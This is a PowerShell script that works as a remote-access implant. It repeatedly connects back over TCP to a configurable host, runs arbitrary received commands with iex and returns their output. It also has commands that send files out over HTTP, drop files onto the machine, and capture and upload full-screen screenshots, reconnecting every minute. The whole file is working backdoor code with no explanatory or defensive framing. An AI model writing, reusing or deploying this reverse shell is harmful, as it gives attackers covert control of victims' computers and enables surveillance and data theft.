$S_HOST = "localhost";
$PORT_TCP = 9999;
$PORT_HTTP = 5566;
$SECRET = "random";

while(1) {try { Get-NetTCPConnection -State Established -RemotePort $PORT_TCP -ErrorAction Stop } catch{
    $client = New-Object System.Net.Sockets.TCPClient($S_HOST,$PORT_TCP);
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        ;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = "";
        switch -Wildcard ( $data ) {
            'download *' {
                Invoke-RestMethod -Uri "http://$S_HOST`:$PORT_HTTP/upload/$(Split-Path $data.Split(" ")[1] -leaf)" -Method PUT -InFile $data.Split(" ")[1] -Headers @{'X-Auth' = $SECRET; 'Action' = 'download'}; 
            }

            'upload *' {
                Invoke-RestMethod -Uri "http://$S_HOST`:$PORT_HTTP/download/$($data.Split(" ")[1])" -Method GET -OutFile $data.Split(" ")[1] -Headers @{'X-Auth' = $SECRET}; 
            }

            'screenshot' {
                $file = "$env:USERPROFILE\$((Get-Random).ToString()).png";
                Add-Type -AssemblyName System.Windows.Forms
                Add-type -AssemblyName System.Drawing
                $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
                $bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
                $graphic = [System.Drawing.Graphics]::FromImage($bitmap).CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size)
                $bitmap.Save($file)
                Invoke-RestMethod -Uri "http://$S_HOST`:$PORT_HTTP/upload" -Method PUT -InFile $file -Headers @{'X-Auth' = $SECRET; 'Action' = 'screenshot'}
                del $file;
            }

            Default {
                $sendback = (iex $data 2>&1 | Out-String );
            }
        }
        $sendback2 = $sendback + (pwd).Path;
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush()};
    $client.Close()
}; Start-Sleep 60}